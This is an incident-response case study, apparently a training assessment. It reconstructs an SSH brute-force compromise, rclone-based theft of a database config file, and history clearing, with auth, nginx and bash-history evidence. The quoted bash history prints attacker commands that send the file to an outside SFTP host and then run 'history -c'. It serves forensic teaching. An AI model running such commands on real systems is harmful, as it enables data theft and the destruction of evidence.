# Case Study 12: "Silent Night" — End-to-End Incident Analysis 🛡️

## 1. Executive Summary
This case study represents a final skills assessment involving a multi-stage system compromise. I identified a successful SSH brute-force attack followed by the unauthorized installation of data exfiltration tools and the subsequent theft of sensitive database configurations. The attacker attempted to destroy evidence by clearing command histories.

## 2. Multi-Source Evidence (The "Smoking Gun")

### A. Authentication Logs (`/var/log/auth.log`)
Feb 17 02:00:15 srv-prod sshd[1102]: Accepted password for dev_admin from 185.220.101.5
Feb 17 02:01:40 srv-prod sudo: dev_admin : COMMAND=/usr/bin/apt install rclone -y

### B. Web Access Logs (/var/log/nginx/access.log)
Plaintext
185.220.101.5 - - [17/Feb/2026:02:10:05] "GET /api/backup/config_db.php HTTP/1.1" 200 85400

### C. Forensic Command History (.bash_history)
Bash
rclone config create remote_storage sftp host=95.122.33.44 user=attacker
rclone copy /var/www/html/api/backup/config_db.php remote_storage: /backups/
history -c

## 3. Technical Analysis (The Kill Chain)
Phase 1: Initial Access (Brute Force)
Finding: After several failed attempts, the attacker successfully authenticated as dev_admin via SSH.
Conclusion: Weak password policy allowed for a successful credential-guessing attack.

Phase 2: Tooling & Persistence
Finding: The attacker installed rclone, a powerful command-line tool for managing cloud storage.
Conclusion: This is a classic "Living off the Land" technique where legitimate tools are used for malicious purposes (Dual-use software).

Phase 3: Data Exfiltration
Finding: The Nginx logs show a successful GET request for config_db.php with a high data volume (85.4 KB).
Conclusion: Database credentials and connection strings were successfully extracted from the server.

Phase 4: Anti-Forensics
Finding: The attacker executed history -c.
Conclusion: A deliberate attempt to hinder an investigation by clearing the bash command history, indicating high-level malicious intent.

## 4. Chain of Custody (Legal Perspective)
Storage chain (legal perspective)
In this attack, I identified the history -c command as important evidence. 
Attempting to destroy records is a clear criminal act that goes beyond the initial unauthorized access. 
All logs were encrypted for possible prosecution under computer fraud laws.
